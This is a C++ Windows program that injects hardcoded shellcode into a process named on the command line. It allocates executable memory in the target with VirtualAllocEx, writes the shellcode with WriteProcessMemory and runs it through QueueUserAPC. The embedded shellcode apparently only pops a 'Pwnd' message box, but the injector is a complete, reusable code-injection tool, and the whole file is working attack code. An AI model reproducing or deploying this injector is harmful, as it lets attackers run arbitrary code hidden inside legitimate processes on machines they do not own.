#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

// Spawns a MessageBox
char shellcode[] = "\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40"
"\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10"
"\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
"\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81"
"\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78"
"\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24"
"\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c"
"\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31"
"\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69"
"\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff"
"\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24"
"\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55"
"\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41"
"\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67"
"\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff"
"\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68"
"\x50\x77\x6e\x64\x89\xe7\x52\x68\x59\x65"
"\x73\x73\x89\xe1\x52\x57\x51\x52\xff\xd0"
"\x83\xc4\x10\x68\x65\x73\x73\x61\x66\x83"
"\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68"
"\x45\x78\x69\x74\x54\x53\xff\xd5\x31\xc9"
"\x51\xff\xd0";

int wmain(int argc, wchar_t **argv) {
    if (argc < 2) {
        std::wcout << "USAGE: " << argv[0] << " <proc_name>" << std::endl;
        return 1;
    }

    std::wcout << "[+] Getting list of active processes..." << std::endl;
    // Creating ToolHelp32 to search through all the processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Error in getting list of active processes" << std::endl;
        return 1;
    }

    PROCESSENTRY32 procEntry;
    procEntry.dwSize = sizeof(PROCESSENTRY32);

    // Searching for the process whose name is pointed by argv[1]
    // By default, if it doesn't find it, the process chosen will be the injector itself
    std::wcout << "[+] Trying to find " << argv[1] << " in the list..." << std::endl;
    for (auto proc = Process32First(hSnapshot, &procEntry); proc; proc = Process32Next(hSnapshot, &procEntry)) {
        if (!lstrcmpW(argv[1], procEntry.szExeFile)) {
            break;
        }
    }

    if (!lstrcmpW(argv[1], procEntry.szExeFile)) {
        std::wcout << "[+] Found process " << procEntry.szExeFile << " with PID " << procEntry.th32ProcessID << std::endl;
    }
    else {
        std::wcout << "[~] No process " << argv[1] << " found. Why not try explorer.exe?" << std::endl;
        return 1;
    }

    CloseHandle(hSnapshot);

    HANDLE hProcess = NULL;
    SIZE_T lpNumberOfBytesWritten;

    // Opening process pointed by procEntry.th32ProcessID
    std::wcout << "[+] Opening chosen process..." << std::endl;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, procEntry.th32ProcessID);
    if (hProcess == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Error opening process " << procEntry.th32ProcessID << std::endl;
        return 1;
    }


    // Allocating memory in remote process
    std::wcout << "[+] Allocating " << sizeof(shellcode) << " bytes in remote process.." << std::endl;
    LPVOID allocatedMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!allocatedMem) {
        std::wcout << "[-] Error in allocating memory" << std::endl;
        return 1;
    }


    // Writing shellcode to allocated memory
    std::wcout << "[+] Writing shellcode at 0x" << std::hex << allocatedMem << std::endl;
    BOOL status = WriteProcessMemory(hProcess, allocatedMem, shellcode, sizeof(shellcode), &lpNumberOfBytesWritten);
    if (!status) {
        std::wcout << "[-] Error in writing shellcode" << std::endl;
        return 1;
    }


    // List all threads in all processes
    std::wcout << "[+] Getting list of all threads in the system..." << std::endl;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Error in getting list of active threads" << std::endl;
        return 1;
    }

    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    // Finally, call QueueUserAPC to the main thread
    std::wcout << "[+] Getting list of active threads in targe process..." << std::endl;
    for (auto thread = Thread32First(hSnapshot, &threadEntry); thread; thread = Thread32Next(hSnapshot, &threadEntry)) {
        if (threadEntry.th32OwnerProcessID == procEntry.th32ProcessID) {
            // Code for queueing APC to main thread
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, threadEntry.th32ThreadID);
            if (!hThread) {
                std::wcout << "[-] Failed opening thread " << threadEntry.th32ThreadID << std::endl;
                continue;
            }
            
            std::wcout << "[+] Queueing APC for thread " << threadEntry.th32ThreadID << "..." << std::endl;
            QueueUserAPC((PAPCFUNC)allocatedMem, hThread, NULL);
            break; // Only on main thread
        }

    }
}
